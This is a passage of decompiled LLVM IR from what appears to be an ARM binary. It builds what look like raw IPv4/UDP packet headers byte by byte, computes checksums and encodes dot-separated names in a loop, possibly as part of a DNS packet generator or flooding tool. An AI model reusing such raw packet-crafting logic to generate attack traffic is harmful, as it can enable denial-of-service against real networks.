  %v5_e054 = mul i32 %v2_e054, 4
  %v6_e054 = add i32 %v5_e054, %v2_dc98
  %v7_e054 = inttoptr i32 %v6_e054 to i32*
  store i32 %v2_e048, i32* %v7_e054, align 4
  %v0_e058 = load i32, i32* %lr.global-to-local, align 4
  %v1_e058 = load i32, i32* %r3.global-to-local, align 4
  %v4_e058 = mul i32 %v1_e058, 4
  %v5_e058 = add i32 %v4_e058, %v0_e058
  %v6_e058 = inttoptr i32 %v5_e058 to i32*
  %v7_e058 = load i32, i32* %v6_e058, align 4
  store i32 %v7_e058, i32* %r1.global-to-local, align 4
  %v1_e05c = inttoptr i32 %v7_e058 to i8*
  %v2_e05c = load i8, i8* %v1_e05c, align 1
  %tmp154 = urem i8 %v2_e05c, 16
  %v1_e060 = zext i8 %tmp154 to i32
  %v1_e064 = or i32 %v1_e060, 64
  store i32 %v1_e064, i32* %r2.global-to-local, align 4
  %v1_e068 = trunc i32 %v1_e064 to i8
  store i8 %v1_e068, i8* %v1_e05c, align 1
  %v0_e06c = load i32, i32* %r1.global-to-local, align 4
  %v1_e06c = inttoptr i32 %v0_e06c to i8*
  %v2_e06c = load i8, i8* %v1_e06c, align 1
  %v1_e070 = and i8 %v2_e06c, -16
  %v1_e074 = or i8 %v1_e070, 5
  store i32 %v1_dd18, i32* %r0.global-to-local, align 4
  store i8 %v1_e074, i8* %v1_e06c, align 1
  store i32 %v4_e080, i32* %r2.global-to-local, align 4
  %v2_e084 = load i32, i32* %r1.global-to-local, align 4
  %v3_e084 = add i32 %v2_e084, 1
  %v4_e084 = inttoptr i32 %v3_e084 to i8*
  store i8 %v5_dcd0, i8* %v4_e084, align 1
  store i32 %v4_dff4, i32* %r3.global-to-local, align 4
  %v0_e08c = load i32, i32* %r0.global-to-local, align 4
  %v2_e08c = icmp eq i32 %v0_e08c, 0
  store i1 %v2_e08c, i1* %cpsr_z.global-to-local, align 1
  %v2_e090 = load i32, i32* %r1.global-to-local, align 4
  %v3_e090 = add i32 %v2_e090, 2
  %v4_e090 = inttoptr i32 %v3_e090 to i8*
  store i8 %v1_e090, i8* %v4_e090, align 1
  store i32 %v3_e010, i32* %r4.global-to-local, align 4
  store i32 %v4_e098, i32* %r0.global-to-local, align 4
  %v0_e09c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e09c, label %.thread21, label %bb143

bb143:                                            ; preds = %dec_label_pc_e040
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_e0a0 = load i32, i32* %r1.global-to-local, align 4
  %v4_e0a0 = add i32 %v3_e0a0, 6
  %v5_e0a0 = inttoptr i32 %v4_e0a0 to i8*
  store i8 64, i8* %v5_e0a0, align 1
  %v0_e0a8.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t76 = trunc i32 %v0_e0a8.pre to i8
  br label %.thread21

.thread21:                                        ; preds = %dec_label_pc_e040, %bb143
  %v0_e0a8.off0 = phi i8 [ %extract.t, %dec_label_pc_e040 ], [ %extract.t76, %bb143 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_e0a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0a8 = add i32 %v2_e0a8, 3
  %v4_e0a8 = inttoptr i32 %v3_e0a8 to i8*
  store i8 %v0_e0a8.off0, i8* %v4_e0a8, align 1
  store i32 %v4_e0ac, i32* %ip.global-to-local, align 4
  store i32 %v4_e0b0, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e46c.86 to i32), i32* %r4.global-to-local, align 4
  %v0_e0b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_e0b8 = trunc i32 %v0_e0b8 to i8
  %v2_e0b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0b8 = add i32 %v2_e0b8, 8
  %v4_e0b8 = inttoptr i32 %v3_e0b8 to i8*
  store i8 %v1_e0b8, i8* %v4_e0b8, align 1
  %v0_e0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e0bc = trunc i32 %v0_e0bc to i8
  %v2_e0bc = load i32, i32* %r1.global-to-local, align 4
  %v3_e0bc = add i32 %v2_e0bc, 9
  %v4_e0bc = inttoptr i32 %v3_e0bc to i8*
  store i8 %v1_e0bc, i8* %v4_e0bc, align 1
  %v0_e0c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e0c0 = trunc i32 %v0_e0c0 to i8
  %v2_e0c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0c0 = add i32 %v2_e0c0, 5
  %v4_e0c0 = inttoptr i32 %v3_e0c0 to i8*
  store i8 %v1_e0c0, i8* %v4_e0c0, align 1
  %v0_e0c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e0c4, label %.thread22, label %bb144

.thread22:                                        ; preds = %.thread21
  %v2_e0c823 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_e0c823, i32* %r3.global-to-local, align 4
  store i32 %v4_df8c, i32* %lr.global-to-local, align 4
  br label %bb145

bb144:                                            ; preds = %.thread21
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e0c8 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_e0c8, i32* %r3.global-to-local, align 4
  store i32 %v4_df8c, i32* %lr.global-to-local, align 4
  %v3_e0d0 = load i32, i32* %r1.global-to-local, align 4
  %v4_e0d0 = add i32 %v3_e0d0, 7
  %v5_e0d0 = inttoptr i32 %v4_e0d0 to i8*
  store i8 0, i8* %v5_e0d0, align 1
  %v0_e0d8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_e0dc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb145

bb145:                                            ; preds = %.thread22, %bb144
  %v0_e0dc = phi i32 [ %v2_e0c823, %.thread22 ], [ %v0_e0dc.pre, %bb144 ]
  %v0_e0d8 = phi i32 [ %v4_df8c, %.thread22 ], [ %v0_e0d8.pre, %bb144 ]
  %v0_e0d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0d4 = add i32 %v0_e0d8, 41
  %v2_e0d8 = add i32 %v1_e0d4, %v0_e0d4
  store i32 %v2_e0d8, i32* %r4.global-to-local, align 4
  %v2_e0dc = add i32 %v0_e0d4, 12
  %v3_e0dc = inttoptr i32 %v2_e0dc to i32*
  store i32 %v0_e0dc, i32* %v3_e0dc, align 4
  store i32 %v4_e0e0, i32* %r2.global-to-local, align 4
  store i32 %v4_e0e4, i32* %r3.global-to-local, align 4
  %v0_e0e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0e8 = add i32 %v0_e0e8, 20
  store i32 %v1_e0e8, i32* %r0.global-to-local, align 4
  %v0_e0ec = load i32, i32* %ip.global-to-local, align 4
  %v1_e0ec = trunc i32 %v0_e0ec to i8
  %v3_e0ec = add i32 %v0_e0e8, 4
  %v4_e0ec = inttoptr i32 %v3_e0ec to i8*
  store i8 %v1_e0ec, i8* %v4_e0ec, align 1
  %v0_e0f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0f0 = trunc i32 %v0_e0f0 to i8
  %v2_e0f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f0 = add i32 %v2_e0f0, 5
  %v4_e0f0 = inttoptr i32 %v3_e0f0 to i8*
  store i8 %v1_e0f0, i8* %v4_e0f0, align 1
  %v0_e0f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e0f4 = trunc i32 %v0_e0f4 to i8
  %v2_e0f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f4 = add i32 %v2_e0f4, 3
  %v4_e0f4 = inttoptr i32 %v3_e0f4 to i8*
  store i8 %v1_e0f4, i8* %v4_e0f4, align 1
  %v0_e0f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_e0f8 = trunc i32 %v0_e0f8 to i8
  %v2_e0f8 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f8 = add i32 %v2_e0f8, 2
  %v4_e0f8 = inttoptr i32 %v3_e0f8 to i8*
  store i8 %v1_e0f8, i8* %v4_e0f8, align 1
  %v0_e0fc = load i32, i32* %sl.global-to-local, align 4
  %v1_e0fc = trunc i32 %v0_e0fc to i8
  %v2_e0fc = load i32, i32* %r0.global-to-local, align 4
  %v3_e0fc = add i32 %v2_e0fc, 4
  %v4_e0fc = inttoptr i32 %v3_e0fc to i8*
  store i8 %v1_e0fc, i8* %v4_e0fc, align 1
  %v0_e100 = load i32, i32* @r5, align 4
  %v1_e100 = trunc i32 %v0_e100 to i8
  %v2_e100 = load i32, i32* %r1.global-to-local, align 4
  %v3_e100 = add i32 %v2_e100, 20
  %v4_e100 = inttoptr i32 %v3_e100 to i8*
  store i8 %v1_e100, i8* %v4_e100, align 1
  store i32 %v4_e108, i32* %r2.global-to-local, align 4
  %v1_e10c = load i32, i32* %r1.global-to-local, align 4
  %v2_e10c = add i32 %v1_e10c, 16
  %v3_e10c = inttoptr i32 %v2_e10c to i32*
  store i32 %stack_var_-2176.0, i32* %v3_e10c, align 4
  %v0_e110 = load i32, i32* %r2.global-to-local, align 4
  %v1_e110 = trunc i32 %v0_e110 to i8
  %v2_e110 = load i32, i32* %r0.global-to-local, align 4
  %v3_e110 = add i32 %v2_e110, 1
  %v4_e110 = inttoptr i32 %v3_e110 to i8*
  store i8 %v1_e110, i8* %v4_e110, align 1
  store i32 %v4_e114, i32* %lr.global-to-local, align 4
  store i32 %v4_df8c, i32* %r0.global-to-local, align 4
  %v0_e11c = load i32, i32* %r1.global-to-local, align 4
  %v1_e11c = add i32 %v0_e11c, 28
  store i32 %v1_e11c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_e128 = load i32, i32* %r8.global-to-local, align 4
  %v1_e128 = trunc i32 %v0_e128 to i8
  %v4_e128 = inttoptr i32 %v1_e11c to i8*
  store i8 %v1_e128, i8* %v4_e128, align 1
  %v0_e12c = load i32, i32* %r3.global-to-local, align 4
  %v1_e12c = trunc i32 %v0_e12c to i8
  %v2_e12c = load i32, i32* %ip.global-to-local, align 4
  %v3_e12c = add i32 %v2_e12c, 5
  %v4_e12c = inttoptr i32 %v3_e12c to i8*
  store i8 %v1_e12c, i8* %v4_e12c, align 1
  %v0_e130 = load i32, i32* %lr.global-to-local, align 4
  %v1_e130 = trunc i32 %v0_e130 to i8
  %v2_e130 = load i32, i32* %ip.global-to-local, align 4
  %v3_e130 = add i32 %v2_e130, 1
  %v4_e130 = inttoptr i32 %v3_e130 to i8*
  store i8 %v1_e130, i8* %v4_e130, align 1
  %v0_e134 = load i32, i32* %r3.global-to-local, align 4
  %v1_e134 = trunc i32 %v0_e134 to i8
  %v2_e134 = load i32, i32* %ip.global-to-local, align 4
  %v3_e134 = add i32 %v2_e134, 2
  %v4_e134 = inttoptr i32 %v3_e134 to i8*
  store i8 %v1_e134, i8* %v4_e134, align 1
  %v0_e138 = load i32, i32* @r6, align 4
  %v1_e138 = trunc i32 %v0_e138 to i8
  %v2_e138 = load i32, i32* %ip.global-to-local, align 4
  %v3_e138 = add i32 %v2_e138, 3
  %v4_e138 = inttoptr i32 %v3_e138 to i8*
  store i8 %v1_e138, i8* %v4_e138, align 1
  %v0_e13c = load i32, i32* @r6, align 4
  %v1_e13c = trunc i32 %v0_e13c to i8
  %v2_e13c = load i32, i32* %ip.global-to-local, align 4
  %v3_e13c = add i32 %v2_e13c, 4
  %v4_e13c = inttoptr i32 %v3_e13c to i8*
  store i8 %v1_e13c, i8* %v4_e13c, align 1
  %v0_e140 = load i32, i32* %r0.global-to-local, align 4
  %v1_e140 = trunc i32 %v0_e140 to i8
  %v2_e140 = load i32, i32* %r1.global-to-local, align 4
  %v3_e140 = add i32 %v2_e140, 40
  %v4_e140 = inttoptr i32 %v3_e140 to i8*
  store i8 %v1_e140, i8* %v4_e140, align 1
  store i32 %v6_dd94, i32* %r1.global-to-local, align 4
  %v0_e148 = load i32, i32* @r7, align 4
  store i32 %v0_e148, i32* %r2.global-to-local, align 4
  %v0_e14c = load i32, i32* %r4.global-to-local, align 4
  %v1_e14c = add i32 %v0_e14c, 1
  store i32 %v1_e14c, i32* %r0.global-to-local, align 4
  %v3_e150 = call i32 @function_12558(i32 %v1_e14c, i32 %v6_dd94, i32 %v0_e148)
  store i32 %v3_e150, i32* %r0.global-to-local, align 4
  store i32 %v2_dee0, i32* %r1.global-to-local, align 4
  %v1_e158 = load i32, i32* @r6, align 4
  %v9_e158 = icmp eq i32 %v2_dee0, %v1_e158
  store i1 %v9_e158, i1* %cpsr_z.global-to-local, align 1
  %v7_e15c = icmp sgt i32 %v2_dee0, %v1_e158
  store i32 %v1_e158, i32* %lr.global-to-local, align 4
  %v0_e16c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e16c, i32* %r2.global-to-local, align 4
  %extract.t78 = trunc i32 %v1_e158 to i8
  br i1 %v7_e15c, label %dec_label_pc_e168, label %dec_label_pc_e1a8

dec_label_pc_e168:                                ; preds = %bb145
  store i32 %v1_e158, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e174

dec_label_pc_e174:                                ; preds = %bb148, %dec_label_pc_e168
  %v0_e19085151 = phi i32 [ %v0_e19085152, %bb148 ], [ %v1_e158, %dec_label_pc_e168 ]
  %v1_e18433 = phi i32 [ %v1_e19491, %bb148 ], [ %v1_e158, %dec_label_pc_e168 ]
  %v1_e180.off0 = phi i8 [ %v1_e18056.off0, %bb148 ], [ %extract.t78, %dec_label_pc_e168 ]
  %v0_e18432 = phi i32 [ %v0_e184325488, %bb148 ], [ %v0_e16c, %dec_label_pc_e168 ]
  store i32 %v6_dd94, i32* %ip.global-to-local, align 4
  %v2_e178 = add i32 %v1_e18433, %v6_dd94
  %v3_e178 = inttoptr i32 %v2_e178 to i8*
  %v4_e178 = load i8, i8* %v3_e178, align 1
  %v6_e178 = zext i8 %v4_e178 to i32
  store i32 %v6_e178, i32* %r3.global-to-local, align 4
  %v7_e17c = icmp eq i8 %v4_e178, 46
  store i1 %v7_e17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e17c, label %bb146, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_e174
  %v2_e18434 = add i32 %v1_e18433, %v0_e18432
  store i32 %v2_e18434, i32* %r0.global-to-local, align 4
  br label %.thread35

bb146:                                            ; preds = %dec_label_pc_e174
  %v3_e180 = load i32, i32* %r2.global-to-local, align 4
  %v4_e180 = inttoptr i32 %v3_e180 to i8*
  store i8 %v1_e180.off0, i8* %v4_e180, align 1
  %v0_e188.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_e184 = load i32, i32* %r4.global-to-local, align 4
  %v1_e184 = load i32, i32* %r1.global-to-local, align 4
  %v2_e184 = add i32 %v1_e184, %v0_e184
  store i32 %v2_e184, i32* %r0.global-to-local, align 4
  br i1 %v0_e188.pr, label %bb147, label %bb146..thread35_crit_edge

bb146..thread35_crit_edge:                        ; preds = %bb146
  %v0_e19085.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread35

bb147:                                            ; preds = %bb146
  %v2_e188 = add i32 %v2_e184, 1
  store i32 %v2_e188, i32* %r2.global-to-local, align 4
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v0_e190 = load i32, i32* %lr.global-to-local, align 4
  %v1_e190 = add i32 %v0_e190, 1
  store i32 %v1_e190, i32* %ip.global-to-local, align 4
  %v1_e194 = add i32 %v1_e184, 1
  store i32 %v1_e194, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb148

.thread35:                                        ; preds = %bb146..thread35_crit_edge, %.thread31
  %v0_e19085 = phi i32 [ %v0_e19085.pre, %bb146..thread35_crit_edge ], [ %v0_e19085151, %.thread31 ]
  %v0_e194.ph = phi i32 [ %v1_e184, %bb146..thread35_crit_edge ], [ %v1_e18433, %.thread31 ]
  %v0_e1843254.ph = phi i32 [ %v0_e184, %bb146..thread35_crit_edge ], [ %v0_e18432, %.thread31 ]
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v1_e19086 = add i32 %v0_e19085, 1
  store i32 %v1_e19086, i32* %ip.global-to-local, align 4
  %v1_e19487 = add i32 %v0_e194.ph, 1
  store i32 %v1_e19487, i32* %r1.global-to-local, align 4
  %v2_e19c = urem i32 %v1_e19086, 256
  store i32 %v2_e19c, i32* %lr.global-to-local, align 4
  %extract.t81 = trunc i32 %v1_e19086 to i8
  br label %bb148

bb148:                                            ; preds = %bb147, %.thread35
  %v0_e19085152 = phi i32 [ 0, %bb147 ], [ %v2_e19c, %.thread35 ]
  %v1_e19491 = phi i32 [ %v1_e194, %bb147 ], [ %v1_e19487, %.thread35 ]
  %v0_e184325488 = phi i32 [ %v0_e184, %bb147 ], [ %v0_e1843254.ph, %.thread35 ]
  %v1_e18056.off0 = phi i8 [ 0, %bb147 ], [ %extract.t81, %.thread35 ]
  %v9_e1a0 = icmp eq i32 %v2_dee0, %v1_e19491
  store i1 %v9_e1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e1a0, label %dec_label_pc_e1a8.loopexit, label %dec_label_pc_e174

dec_label_pc_e1a8.loopexit:                       ; preds = %bb148
  %v2_e1a8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e1a8.loopexit, %bb145
  %v2_e1a8 = phi i32 [ %v2_e1a8.pre, %dec_label_pc_e1a8.loopexit ], [ %v0_e16c, %bb145 ]
  %v0_e1a8.off0 = phi i8 [ %v1_e18056.off0, %dec_label_pc_e1a8.loopexit ], [ %extract.t78, %bb145 ]
  %v3_e1a8 = inttoptr i32 %v2_e1a8 to i8*
  store i8 %v0_e1a8.off0, i8* %v3_e1a8, align 1
  %v3_e1ac = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_dee0, i32* %r1.global-to-local, align 4
  %v0_e1b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_e1b4 = add i32 %v0_e1b4, %v2_dee0
  store i32 %v2_e1b4, i32* %r3.global-to-local, align 4
  %v1_e1b8 = add i32 %v3_e1ac, 1
  store i32 %v1_e1b8, i32* @r4, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  %v9_e1c8 = icmp eq i32 %v1_dc80, %v1_e1b8
  store i1 %v9_e1c8, i1* %cpsr_z.global-to-local, align 1
  %v1_e1cc = add i32 %v2_e1b4, 2
  store i32 %v1_e1cc, i32* %r2.global-to-local, align 4
  %v4_e1d0 = inttoptr i32 %v1_e1cc to i8*
  store i8 0, i8* %v4_e1d0, align 1
  %v0_e1d4 = load i32, i32* @lr, align 4
  %v1_e1d4 = trunc i32 %v0_e1d4 to i8
  %v2_e1d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e1d4 = add i32 %v2_e1d4, 3
  %v4_e1d4 = inttoptr i32 %v3_e1d4 to i8*
  store i8 %v1_e1d4, i8* %v4_e1d4, align 1
  %v0_e1d8 = load i32, i32* @lr, align 4
  %v1_e1d8 = trunc i32 %v0_e1d8 to i8
  %v2_e1d8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e1d8 = add i32 %v2_e1d8, 1
  %v4_e1d8 = inttoptr i32 %v3_e1d8 to i8*
  store i8 %v1_e1d8, i8* %v4_e1d8, align 1
  %v0_e1dc = load i32, i32* %ip.global-to-local, align 4
  %v1_e1dc = trunc i32 %v0_e1dc to i8
  %v2_e1dc = load i32, i32* %r2.global-to-local, align 4
  %v3_e1dc = add i32 %v2_e1dc, 2
  %v4_e1dc = inttoptr i32 %v3_e1dc to i8*
  store i8 %v1_e1dc, i8* %v4_e1dc, align 1
  %v0_e1e0 = load i32, i32* @r4, align 4
  store i32 %v0_e1e0, i32* %stack_var_-40, align 4
  %v8_e1e4 = icmp sgt i32 %v1_dc80, %v1_e1b8
  br i1 %v8_e1e4, label %dec_label_pc_e040, label %dec_label_pc_e1e8

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1a8, %dec_label_pc_e3b4
  %v4_e258.pre-phi = phi i32 [ %v4_e3b8, %dec_label_pc_e3b4 ], [ %v4_df8c, %dec_label_pc_e1a8 ]
  store i32 %v1_dc80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_df64, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e1f4

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e1f4, %dec_label_pc_e318, %dec_label_pc_e1e8
  br i1 %v2_df64, label %dec_label_pc_e1f4, label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %dec_label_pc_e1f4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r6, align 4
  %v0_e208 = load i32, i32* @fp, align 4
  %v1_e208 = add i32 %v0_e208, 27
  store i32 %v1_e208, i32* @sb, align 4
  %v1_e20c = add i32 %v0_e208, 47
  store i32 %v1_e20c, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_e214

dec_label_pc_e214:                                ; preds = %dec_label_pc_e254.dec_label_pc_e214_crit_edge, %dec_label_pc_e1f8
  %v1_e234 = phi i32 [ %v1_e220.pre, %dec_label_pc_e254.dec_label_pc_e214_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), %dec_label_pc_e1f8 ]
  %v1_e21c = phi i32 [ %v1_e304, %dec_label_pc_e254.dec_label_pc_e214_crit_edge ], [ 0, %dec_label_pc_e1f8 ]
  store i32 %v2_dc98, i32* %r3.global-to-local, align 4
  store i32 %v3_df54, i32* %r8.global-to-local, align 4
  %v4_e21c = mul i32 %v1_e21c, 4
  %v5_e21c = add i32 %v4_e21c, %v2_dc98
  %v6_e21c = inttoptr i32 %v5_e21c to i32*
  %v7_e21c = load i32, i32* %v6_e21c, align 4
  store i32 %v7_e21c, i32* @r4, align 4
  %v9_e220 = icmp eq i32 %v3_df54, %v1_e234
  store i1 %v9_e220, i1* %cpsr_z.global-to-local, align 1
  %v1_e224 = add i32 %v7_e21c, 20
  store i32 %v1_e224, i32* @r5, align 4
  %v1_e228 = add i32 %v7_e21c, 28
  store i32 %v1_e228, i32* @r8, align 4
  br i1 %v9_e220, label %dec_label_pc_e328, label %dec_label_pc_e230

dec_label_pc_e230:                                ; preds = %dec_label_pc_e214
  store i32 %v3_df58, i32* %ip.global-to-local, align 4
  %v9_e234 = icmp eq i32 %v3_df58, %v1_e234
  store i1 %v9_e234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e234, label %dec_label_pc_e344, label %dec_label_pc_e23c

dec_label_pc_e23c:                                ; preds = %dec_label_pc_e328.dec_label_pc_e23c_crit_edge, %dec_label_pc_e230
  %v1_e240 = phi i32 [ %v1_e240.pre, %dec_label_pc_e328.dec_label_pc_e23c_crit_edge ], [ %v1_e234, %dec_label_pc_e230 ]
  store i32 %v3_df5c, i32* @lr, align 4
  %v9_e240 = icmp eq i32 %v3_df5c, %v1_e240
  store i1 %v9_e240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e240, label %dec_label_pc_e360, label %dec_label_pc_e248

dec_label_pc_e248:                                ; preds = %dec_label_pc_e344.dec_label_pc_e248_crit_edge, %dec_label_pc_e23c
  %v1_e24c = phi i32 [ %v1_e24c.pre, %dec_label_pc_e344.dec_label_pc_e248_crit_edge ], [ %v1_e240, %dec_label_pc_e23c ]
  store i32 %v3_df60, i32* %r0.global-to-local, align 4
  %v9_e24c = icmp eq i32 %v3_df60, %v1_e24c
  store i1 %v9_e24c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e24c, label %dec_label_pc_e37c, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e360, %dec_label_pc_e248, %dec_label_pc_e37c
  %v0_e254 = load i32, i32* @r4, align 4
  %v1_e254 = add i32 %v0_e254, 41
  store i32 %v1_e254, i32* %r0.global-to-local, align 4
  store i32 %v4_e258.pre-phi, i32* %r1.global-to-local, align 4
  %v2_e25c = call i32 @function_fed8(i32 %v1_e254, i32 %v4_e258.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_e264 = load i32, i32* @r7, align 4
  %v1_e264 = trunc i32 %v0_e264 to i8
  %v2_e264 = load i32, i32* @r4, align 4
  %v3_e264 = add i32 %v2_e264, 10
  %v4_e264 = inttoptr i32 %v3_e264 to i8*
  store i8 %v1_e264, i8* %v4_e264, align 1
  %v0_e268 = load i32, i32* @r7, align 4
  %v1_e268 = trunc i32 %v0_e268 to i8
  %v2_e268 = load i32, i32* @r4, align 4
  %v3_e268 = add i32 %v2_e268, 11
  %v4_e268 = inttoptr i32 %v3_e268 to i8*
  store i8 %v1_e268, i8* %v4_e268, align 1
  %v0_e26c = load i32, i32* @r4, align 4
  store i32 %v0_e26c, i32* @r0, align 4
  %v2_e270 = call i32 @function_e424(i32 %v0_e26c, i32 20)
  %v3_e270 = trunc i32 %v2_e270 to i8
  store i32 %v2_e270, i32* %r0.global-to-local, align 4
  %v4_e274 = sdiv i32 %v2_e270, 256
  store i32 %v4_e274, i32* %r3.global-to-local, align 4
  %v1_e278 = trunc i32 %v4_e274 to i8
  %v2_e278 = load i32, i32* @r4, align 4
  %v3_e278 = add i32 %v2_e278, 11
  %v4_e278 = inttoptr i32 %v3_e278 to i8*
  store i8 %v1_e278, i8* %v4_e278, align 1
  %v3_e27c = load i32, i32* @r4, align 4
  %v4_e27c = add i32 %v3_e27c, 10
  %v5_e27c = inttoptr i32 %v4_e27c to i8*
  store i8 %v3_e270, i8* %v5_e27c, align 1
  %v0_e280 = load i32, i32* @r7, align 4
  %v1_e280 = trunc i32 %v0_e280 to i8
  %v2_e280 = load i32, i32* @r5, align 4
  %v3_e280 = add i32 %v2_e280, 6
  %v4_e280 = inttoptr i32 %v3_e280 to i8*
  store i8 %v1_e280, i8* %v4_e280, align 1
  %v0_e284 = load i32, i32* @r7, align 4
  %v1_e284 = trunc i32 %v0_e284 to i8
  %v2_e284 = load i32, i32* @r5, align 4
  %v3_e284 = add i32 %v2_e284, 7
  %v4_e284 = inttoptr i32 %v3_e284 to i8*
  store i8 %v1_e284, i8* %v4_e284, align 1
  %v0_e288 = load i32, i32* @r4, align 4
  %v1_e288 = add i32 %v0_e288, 24
  %v2_e288 = inttoptr i32 %v1_e288 to i8*
  %v3_e288 = load i8, i8* %v2_e288, align 1
  %v4_e288 = zext i8 %v3_e288 to i32
  store i32 %v4_e288, i32* %r3.global-to-local, align 4
  %v1_e28c = add i32 %v0_e288, 25
  %v2_e28c = inttoptr i32 %v1_e28c to i8*
  %v3_e28c = load i8, i8* %v2_e28c, align 1
  %v4_e28c = zext i8 %v3_e28c to i32
  %v0_e290 = load i32, i32* @r5, align 4
  store i32 %v0_e290, i32* @r1, align 4
  %v4_e294 = mul nuw nsw i32 %v4_e28c, 256
  %v5_e294 = or i32 %v4_e294, %v4_e288
  store i32 %v5_e294, i32* %r2.global-to-local, align 4
  store i32 %v0_e288, i32* %r0.global-to-local, align 4
  %v0_e29c = load i32, i32* @sb, align 4
  store i32 %v0_e29c, i32* %r3.global-to-local, align 4
  %v4_e2a0 = call i32 @function_e480(i32 %v0_e288, i32 %v0_e290, i32 %v5_e294, i32 %v0_e29c)
  %v5_e2a0 = trunc i32 %v4_e2a0 to i8
  store i32 %v4_e2a0, i32* %r0.global-to-local, align 4
  %v3_e2a4 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_e2b4 = mul i32 %v3_e2a4, 24
  %v2_e2b8 = add i32 %v5_e2b4, %arg2
  store i32 %v2_e2b8, i32* %lr.global-to-local, align 4
  %v4_e2bc = sdiv i32 %v4_e2a0, 256
  store i32 %v4_e2bc, i32* %r3.global-to-local, align 4
  %v3_e2c0 = load i32, i32* @r5, align 4
  %v4_e2c0 = add i32 %v3_e2c0, 6
  %v5_e2c0 = inttoptr i32 %v4_e2c0 to i8*
  store i8 %v5_e2a0, i8* %v5_e2c0, align 1
  %v0_e2c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2c4 = trunc i32 %v0_e2c4 to i8
  %v2_e2c4 = load i32, i32* @r5, align 4
  %v3_e2c4 = add i32 %v2_e2c4, 7
  %v4_e2c4 = inttoptr i32 %v3_e2c4 to i8*
  store i8 %v1_e2c4, i8* %v4_e2c4, align 1
  %v0_e2c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2c8 = load i32, i32* %lr.global-to-local, align 4
  %v2_e2c8 = add i32 %v1_e2c8, 4
  %v3_e2c8 = inttoptr i32 %v2_e2c8 to i32*
  store i32 %v0_e2c8, i32* %v3_e2c8, align 4
  %v0_e2cc = load i32, i32* @r4, align 4
  %v1_e2cc = add i32 %v0_e2cc, 20
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  %v3_e2cc = load i32, i32* %v2_e2cc, align 4
  %v3_e2d0 = udiv i32 %v3_e2cc, 65536
  store i32 %v3_e2d0, i32* %r3.global-to-local, align 4
  %v3_e2d412 = udiv i32 %v3_e2cc, 16777216
  %v1_e2d8 = trunc i32 %v3_e2d412 to i8
  %v2_e2d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_e2d8 = add i32 %v2_e2d8, 3
  %v4_e2d8 = inttoptr i32 %v3_e2d8 to i8*
  store i8 %v1_e2d8, i8* %v4_e2d8, align 1
  %v0_e2dc = load i32, i32* %r3.global-to-local, align 4
  %v1_e2dc = trunc i32 %v0_e2dc to i8
  %v2_e2dc = load i32, i32* %lr.global-to-local, align 4
